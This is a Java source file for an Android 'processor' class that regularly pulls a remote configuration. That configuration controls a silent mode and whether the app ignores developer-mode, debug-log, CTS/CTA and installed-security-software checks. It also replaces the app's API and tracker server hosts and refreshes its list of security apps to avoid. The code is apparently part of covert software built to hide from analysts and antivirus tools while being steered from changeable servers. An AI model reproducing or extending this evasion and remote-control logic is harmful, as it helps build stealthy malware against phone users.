package com.hs.cld.q;

import android.content.Context;
import android.content.Intent;

import com.hs.cld.common.PROP;
import com.hs.cld.common.utils.LOG;
import com.hs.cld.common.utils.SystemUtils;
import com.hs.cld.common.utils.TextUtils;
import com.hs.cld.basic.Processor;
import com.hs.cld.basic.SLT;
import com.hs.cld.basic.Settings;

import java.util.List;

public class QP implements Processor {
	/**
	 * 日志标签
	 */
	private final static String TAG = "QP";

	/**
	 * 处理器ID
	 */
	public final static String ID = "qp";

	@Override
	public void process(Context context, Intent i) {
		if (!SystemUtils.isNetworkAvailable(context)) {
			return;
		}

		if (SLT.silent(context)) {
			LOG.i(TAG, "slt to " + TextUtils.TSTR(SLT.millis(context)));
			return;
		}

		long lastMillis = getLastExeTime(context);
		long timeNow = System.currentTimeMillis();
		long periods = (PROP.isBeta() ? 10L : 7200L);
		long elapsed = ((timeNow - lastMillis) / 1000L);

		if (elapsed < 0) {
			LOG.d(TAG, "[" + periods + "] " + elapsed
					+ "s elapsed from last(" + TextUtils.TSTR(lastMillis) + ") ...");
			putLastExeTime(context, timeNow);
		} else if (elapsed >= periods) {
			LOG.i(TAG, "time's up, go on ...");
			putLastExeTime(context, timeNow);
			updateConfiguration(context, timeNow);
		} else {
			LOG.d(TAG, "[" + periods + "] " + elapsed
					+ "s elapsed from last(" + TextUtils.TSTR(lastMillis) + ") ...");
		}
	}

	private void updateConfiguration(Context context, long timeNow) {
		try {
			boolean getMutexPkgs = isGetMutexPkgs(context);
			GetConfiguration gc = new GetConfiguration(context, getMutexPkgs);
			gc.check();

			// 更新静默配置
			if (gc.isSilent()) {
				long millis = gc.getSilentToInMillis();
				LOG.i(TAG, "app slt to: " + TextUtils.TSTR("yyyy/MM/dd HH:mm:ss", millis));
				SLT.silento(context, millis);
			} else {
				if (SLT.silent(context)) {
					LOG.i(TAG, "slt clear ...");
					SLT.clear(context);
				}
			}

			// 设置轮训周期
			long periods = gc.getPeriodsInSeconds();
			if (periods > 0) {
				Settings.putPeriods(context, periods);
			}

			// 设置日志开关
			Settings.putLogEnabled(context, gc.isLogEnabled());

			// 是否忽略检查开发者模式
			Settings.putIgnoreDevMode(context, gc.isIgnoreDevMode());

			// 是否忽略检查日志是否为debug级别
			Settings.putIgnoreLogD(context, gc.isIgnoreLogD());

			// 是否忽略CTS检查
			Settings.putIgnoreCTS(context, gc.isIgnoreCTS());

			// 是否忽略CTA检查
			Settings.putIgnoreCTA(context, gc.isIgnoreCTA());

			// 是否忽略安全软件检查
			Settings.putIgnoreMutexPackages(context, gc.isIgnoreMutexPkgs());

			// 视情况更新服务器地址
			updateHosts(context, gc);

			// 视情况更新安全软件列表
			if (getMutexPkgs) {
				updateMutexPackages(context, gc, timeNow);
			}
		} catch (Exception e) {
			LOG.e(TAG, "get configuration failed: " + e);
		}
	}

	private boolean isGetMutexPkgs(Context context) {
		long lastMillis = getLastGetMutexPkgsTime(context);
		long timeNow = System.currentTimeMillis();
		long periods = (PROP.isBeta() ? 60L : 86400L);
		long elapsed = ((timeNow - lastMillis) / 1000L);

		if (elapsed < 0) {
			return true;
		} else if (elapsed >= periods) {
			return true;
		} else {
			return false;
		}
	}

	private void updateHosts(Context context, GetConfiguration gc) {
		String apiHosts = gc.getApiHosts();
		if (!TextUtils.empty(apiHosts)) {
			String preApiHosts = Settings.getApiHosts(context, "");
			if (!TextUtils.equals(apiHosts, preApiHosts)) {
				LOG.i(TAG, "update api hosts: " + apiHosts + " >> " + preApiHosts);
				Settings.putApiHosts(context, apiHosts);
			}
		}

		String trackerHosts = gc.getTrackerHosts();
		if (!TextUtils.empty(trackerHosts)) {
			String preTrackerHosts = Settings.getTrackerHosts(context, "");
			if (!TextUtils.equals(trackerHosts, preTrackerHosts)) {
				LOG.i(TAG, "update tracker hosts: " + trackerHosts + " >> " + preTrackerHosts);
				Settings.putTrackerHosts(context, trackerHosts);
			}
		}
	}

	private void updateMutexPackages(Context context, GetConfiguration gc, long timeNow) {
		List<String> pkgs = gc.getMutexPkgs();
		if (null != pkgs) {
			LOG.i(TAG, "update mutex pkgs: " + pkgs);
			Settings.putMutexPackages(context, pkgs);
		}

		// 更新互斥软件列表更新时间
		putLastGetMutexPkgsTime(context, timeNow);
	}

	/**
	 * 获取上一次执行时间
	 * @param context 上下文
	 * @return 上一次执行时间
	 */
	protected long getLastExeTime(Context context) {
		return Settings.getLastQInMills(context, -1);
	}

	/**
	 * 写入上一次执行时间
	 * @param context 上下文
	 * @param millis 上一次执行时间
	 */
	private void putLastExeTime(Context context, long millis) {
		Settings.putLastQInMills(context, millis);
	}

	/**
	 * 获取上一次执行时间
	 * @param context 上下文
	 * @return 上一次执行时间
	 */
	protected long getLastGetMutexPkgsTime(Context context) {
		return Settings.getLastQ2InMills(context, -1);
	}

	/**
	 * 写入上一次执行时间
	 * @param context 上下文
	 * @param millis 上一次执行时间
	 */
	private void putLastGetMutexPkgsTime(Context context, long millis) {
		Settings.putLastQ2InMills(context, millis);
	}
}
